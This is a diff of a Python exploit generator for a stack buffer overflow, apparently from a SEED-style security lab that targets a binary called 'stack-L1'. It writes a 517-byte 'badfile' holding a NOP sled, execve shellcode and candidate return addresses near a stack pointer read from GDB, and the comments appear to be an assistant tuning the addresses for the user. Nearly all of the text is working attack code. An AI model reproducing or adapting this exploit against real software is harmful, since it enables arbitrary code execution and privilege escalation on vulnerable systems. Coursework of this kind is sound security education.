@@ -7,19 +7,20 @@ shellcode= (
   "\xd2\x31\xc0\xb0\x0b\xcd\x80"
 ).encode('latin-1')
 
-# Test different return addresses
+# Test addresses based on what we saw in your GDB output
+# Your ESP was around 0xffffcaa0, so let's test around that area
 test_addresses = [
-    0xffffcb00,
-    0xffffcb10, 
-    0xffffcb20,
-    0xffffcb30,
-    0xffffcb40,
-    0xffffcb50,
-    0xffffcb60,
-    0xffffcb70
+    0xffffca80,
+    0xffffca90,
+    0xffffcaa0,  # This was your ESP
+    0xffffcab0,
+    0xffffcac0,
+    0xffffcad0,
+    0xffffcae0,
+    0xffffcaf0
 ]
 
-for addr in test_addresses:
+for i, addr in enumerate(test_addresses):
     content = bytearray(0x90 for i in range(517))
     
     # Place shellcode at position 300
@@ -36,6 +37,7 @@ for addr in test_addresses:
     with open('badfile', 'wb') as f:
         f.write(content)
     
-    print(f"Testing address: 0x{addr:08x}")
-    # You'll manually test each one
-    break  # Remove this to generate all addresses
+    print(f"Test {i+1}: Address 0x{addr:08x}")
+    print("Run: ./stack-L1")
+    print("Press Enter after testing to continue to next address...")
+    input()
